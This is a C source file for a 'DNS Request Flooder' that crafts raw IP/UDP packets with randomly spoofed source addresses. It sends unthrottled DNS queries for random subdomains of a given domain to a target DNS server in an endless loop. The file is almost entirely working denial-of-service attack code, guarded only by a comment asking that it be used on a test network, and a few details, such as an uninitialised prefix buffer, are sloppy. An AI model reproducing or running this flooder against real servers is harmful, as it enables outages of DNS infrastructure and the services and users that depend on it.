/* 
 * DNS Request Flooder, v0.1
 *
 * All rights left, mirnshi
 * 
 * To compile: gcc -o drf drf.c -Wall
 *
 * NOTE: use it in the test network!!!!
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>        /* gethostbyname */
#include <unistd.h>        /* usleep */
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#define random(x) (rand()%x)


struct iphdr {
    u_int   ihl:4,        /* ip header length, should be 20 bytes */
            ver:4;        /* version */
    u_char  tos;        /* type of service */
    u_short len;        /* ip packet length */
    u_short id;            /* identification */
    u_short frag;        /* fragment offset field */
    u_char  ttl;        /* time to live */
    u_char  proto;        /* protocol */
    u_short sum;        /* checksum */
    u_int   sip;
    u_int   dip;        /* source and dest address */
};

struct udphdr {
    u_short    sport;        /* source port */
    u_short    dport;        /* destination port */
    u_short    len;        /* udp length */
    u_short    sum;        /* udp checksum */
};

u_char dns1[] = {
    0x4c, 0x42, /* ID */
    0x01, 0x00, /* QR|OC|AA|TC|RD -  RA|Z|RCODE  */
    0x00, 0x01, /* QDCOUNT */
    0x00, 0x00, /* ANCOUNT */
    0x00, 0x00, /* NSCOUNT */
    0x00, 0x00, /* ARCOUNT */
};
u_char dns2[] = {
    0x00,0x01,    /* QTYPE A record */
    0x00,0x01    /* QCLASS: IN */
    /* If you want to lookup root servers instead, use this: */
    /*    0x00,        QNAME:  empty */
    /*    0x00, 0x02,  QTYPE:  a authorative name server */
    /*    0x00, 0x01   QCLASS: IN */
};

char dns[512];
int dns_len;

int s;

/* generate dns data packet */
void
gen_dns_data(char *name)
{
    char b[512];
    int n = 0;
    char *p, *q = b;
    const char *sep = ".";
    char *brkt;
    
    memcpy(dns, dns1, sizeof(dns1));

    for ((p = strtok_r(name, sep, &brkt)); p; (p = strtok_r(NULL, sep, &brkt))) {
        *q++ = strlen(p);
        n = sprintf(q, "%s", p);
        q+= n;
        *q = 0;
    }
    n = strlen(b) + 1;
        
    memcpy(dns + sizeof(dns1), b, n);
    memcpy(dns + sizeof(dns1) + n, dns2, sizeof(dns2));
    dns_len = sizeof(dns1) + n + sizeof(dns2);
}        
/* check sum */
unsigned short
ip_sum (char *addr, int len)
{
    register u_short nleft = len;
    register u_short *w;
    register int sum = 0;
    
    w = (u_short *)addr;
    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1)
        sum += (*(u_char *)w & 0xff);

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    
    return (~sum & 0xffff);
}

unsigned long 
getaddr(char *name)
{
    struct hostent *h;
    
    h = gethostbyname(name);
    if (!h) {
        printf("Unknown host %s\n", name);
        exit(-1);
    }
    return *(unsigned long *)h->h_addr;
}


void
send_dns(unsigned long lip, unsigned long rip, unsigned short port) 
{
    struct iphdr ih;
    struct udphdr uh;
    struct sockaddr_in sin;
    char buf[512];

    ih.ver = 4;
    ih.ihl = 5;
    ih.tos = 0;            
    ih.len = sizeof(ih) + sizeof(uh) + dns_len;
    ih.id = port;
    ih.frag = 0;
    ih.ttl = 64;
    ih.proto = 17;
    
    ih.sum = 0;
    ih.sip = lip;
    ih.dip = rip;
    
    uh.sport = htons(port);
    uh.dport = 0x3500;
    uh.len = htons(sizeof(uh) + dns_len);
    uh.sum = 0;
    
    memcpy(buf, &ih, sizeof(ih));
    ih.sum = ip_sum(buf, sizeof(ih));
    
    memcpy(buf + 4 * ih.ihl, &uh, sizeof(uh));
    memcpy(buf + 4 * ih.ihl + sizeof(uh), dns, dns_len);
    
    sin.sin_family = AF_INET;
    sin.sin_port = uh.dport;
    sin.sin_addr.s_addr = ih.dip;
    
    sendto(s, buf, 4*ih.ihl + sizeof(uh)+ dns_len, 0, (struct sockaddr *)&sin, sizeof(sin));
}

int
main(int argc, char *argv[])
{
   int urip;
   unsigned long rip, lip;
   struct timeval tp;
   int hdrincl = 1;
   int usec = 1;
   unsigned long long rt = 0;
   int rtf = 0;
   int cc=0;
   char prefix[64];
   char mystr[512];
   char ipstr[512];
//Generate Random Strings
   srand( (unsigned) time( (time_t *) 0 ));   
   void generate_random_string( char *str, unsigned long len )
   {
    const char *chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    unsigned int max = strlen( chars );
    unsigned long i = 0L;

    for ( ; i < len ; ++i ) 
        {
            str[ i ] = chars[ rand() % max ];
        }
        str[ i ] = '\0';
   }

    if (argc < 4) {
        printf("%s caddr dnsaddr domainname\n", argv[0]);
        printf("NOTE: use it in the test network!!!!\n");    
        return -1;
    }
    
    if( atoi(argv[1]) == 0 )
        urip = 1;
    else    
        lip = getaddr(argv[1]);
        
    rip = getaddr(argv[2]);

    //gen_dns_data(argv[3]);
    
    if (argc == 5)
        usec = atoi(argv[4]);
    
    if (argc == 6)
        rtf = atoi(argv[5]);    

    s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) {
        printf("socket open error.");
        return -1;
    }
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &hdrincl, sizeof(hdrincl));

    while (1) {
        gettimeofday(&tp, NULL);
        sprintf(mystr,"%s.%s",prefix,argv[3]);
        gen_dns_data(mystr);
        sprintf(ipstr,"%d.%d.%d.%d",random(253)+1,random(254),random(254),random(254));
        lip=getaddr(ipstr);
        send_dns(lip, rip, tp.tv_usec % 50000 + 1024);
        rt++;
        if (rtf && !(rt % rtf)) {
            printf("\r                    \r%lld", rt);
            fflush(stdout);
        }
        generate_random_string(prefix,6);
//         usleep(usec); 
    }
    return 0;
}



